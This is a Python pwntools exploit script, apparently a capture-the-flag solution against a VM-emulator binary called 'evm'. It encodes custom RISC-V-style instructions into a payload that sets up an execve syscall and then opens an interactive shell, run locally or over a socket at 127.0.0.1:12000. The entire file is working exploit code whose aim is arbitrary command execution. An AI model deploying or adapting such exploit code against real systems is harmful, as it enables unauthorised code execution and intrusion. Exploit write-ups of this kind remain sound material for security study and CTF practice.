from pwn import *
context.update(arch='amd64', os='linux')
context.log_level = 'info'
exe_path = ('./evm')
exe = context.binary = ELF(exe_path)
# libc = ELF('')

host = '127.0.0.1'
port = 12000
if sys.argv[1] == 'r':
    p = remote(host, port)
elif sys.argv[1] == 'p':
    p = process(exe_path)  
else:
    p = gdb.debug(exe_path, 'decompiler connect ida --host localhost --port 3662')
    
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def gdb_pause(p):
    gdb.attach(p)  
    pause()


def addi(rd, rs1, imm):
    return p32((imm << 20) | (rs1 << 15) | (0b000 << 12) | (rd << 7) | 0x13)


def slli(rd, rs1, imm):
    return p32((imm << 20) | (rs1 << 15) | (0b001 << 12) | (rd << 7) | 0x13)


def reg_xor(rd, rs1, rs2):
    return p32((0 << 25) | (rs2 << 20) | (rs1 << 15) | (0b100 << 12) | (rd << 7) | 0x33)


def syscall():
    return p32(0x73)


def store_memory(rs1, rs2, imm, funct3):
    return p32(
        ((imm >> 5) << 25)
        | (rs2 << 20)
        | (rs1 << 15)
        | (funct3 << 12)
        | ((imm & 0x1F) << 7)
        | 0x2F
    )


def blt(rs1, rs2, imm):
    imm = conv12(imm)
    print(imm, hex(imm))

    val = (
        0x63
        | (((imm >> 10) & 1) << 7)
        | (((imm) & 0b1111) << 8)
        | (0b100 << 12)
        | (rs1 << 15)
        | (rs2 << 20)
        | (((imm >> 4) & 0b111111) << 25)
        | (((imm >> 11) & 1) << 31)
    )
    return p32(val)


def conv12(n):
    if n < 0:
        n = n & 0xFFF
    binary = bin(n)[2:]
    while len(binary) < 12:
        binary = "0" + binary
    return int(binary, 2)


context.log_level = "DEBUG"


def pwn():
    # global r
    # r = conn()
    payload = (
        p32(0x13) * 4
        + reg_xor(0, 0, 0)
        + reg_xor(1, 1, 1)
        + reg_xor(2, 2, 2)
        + reg_xor(3, 3, 3)
        + addi(2, 2, 511)
        + addi(1, 1, 0x73)
        # + addi(0, 0, 0x4)
        + addi(0, 0, (0x1000) // 2)
        + addi(0, 0, (0x1000) // 2)
        + store_memory(0, 1, 0, 3)
        + addi(3, 3, 1)
        + blt(3, 2, -4 * 5)
        + reg_xor(10, 10, 10)
        + reg_xor(11, 11, 11)
        + reg_xor(12, 12, 12)
        + reg_xor(13, 13, 13)
        + addi(10, 10, 0x3B)
        + addi(11, 11, 0x405)
        + slli(11, 11, 12)
        + addi(11, 11, 0xA0)
    )
    payload = payload + p32(0x13) * ((0x1000 - 8 - len(payload)) // 4)
    p.sendlineafter(b"standard", f"{len(payload)}".encode())
    p.sendline(b"1")
    p.send(payload)
    p.sendline(b"16")
    p.sendline(b"1")
    p.send(p32(0x13) * 4)

    p.interactive()
    

pwn()